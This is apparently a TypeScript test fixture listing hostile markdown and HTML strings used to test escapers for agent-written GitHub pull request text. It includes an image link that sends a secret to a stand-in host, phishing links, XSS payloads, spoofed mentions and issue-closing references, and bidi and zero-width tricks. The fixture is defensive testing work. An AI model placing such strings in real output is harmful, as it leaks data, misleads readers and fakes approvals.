/**
 * Text an agent read or a model wrote, as it could reach a pull request's body, the Action's comment
 * or a job summary: each shows something GitHub renders, links, mentions or cross-references, or hides
 * or reorders what is shown. markdown.test.ts and the Action's tests hold both escapers to them.
 */
export const HOSTILE = [
  '![pixel](https://evil.example/t.png?d=secret)', '[click here](https://evil.example/login)', '[x][1]\n\n[1]: https://evil.example', 'see [^1]\n\n[^1]: https://evil.example',
  '<https://evil.example>', 'https://evil.example/phish', 'www.evil.example', 'HTTPS://EVIL.EXAMPLE', 'WWW.EVIL.EXAMPLE/x', 'ftp://evil.example/x', 'mailto:a@evil.example',
  'mail me at admin@evil.example', '@alice please approve', 'cc @northwind/security-team', '((@zed))', '@a@b', '[@yan](https://evil.example)', 'x@bob is not one, but @carol is',
  'fixes #1', 'closes northwind/agent#2', 'see GH-3', '#4 at the start', '(#7)', '[#8]', '&#64;dave via an entity', '&#x40;hex', '&commat;named', '#&#49;2', '&#91;x&#93;(https://evil.example)',
  '`code` then @erin', '``` fence', '`@inside code`', 'a \\[b\\](https://evil.example)', '\\@frank', '\\\\![x](y)', 'trailing \\',
  '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', '<!-- hidden --> shown', '<!-->', '<![CDATA[x]]>', '<?php system(1); ?>', '<details><summary>a</summary>b', '</summary><img src=x>', '<a href="https://evil.example">x</a>', '&lt;img src=x&gt;',
  '$\\color{red}\\text{Approved}$', '$$x$$', '**bold** _it_ ~~strike~~ :smile:', '***', '___', 'pipe | in | cell', '| a | b |', '\\| escaped pipe',
  '# heading', '> quote', '- item', '+++', '1. item', '2) item', '---', '=== under', '- [ ] task',
  'line\nbreak\r\nand\u2028sep', 'bidi \u202eevil\u202c here', 'zero\u200bwidth @gr\u200bace', 'tab\there', 'nul\u0000byte',
  'a&b <= c >= d', '<=5% risk, up to 80 attempts', 'issue_refund called 0 times, but called 1 time', 'model call #5 (3 of 5)', '{"to":"oncall@example.com","amount":240}', 'C:\\path\\to\\file',
];
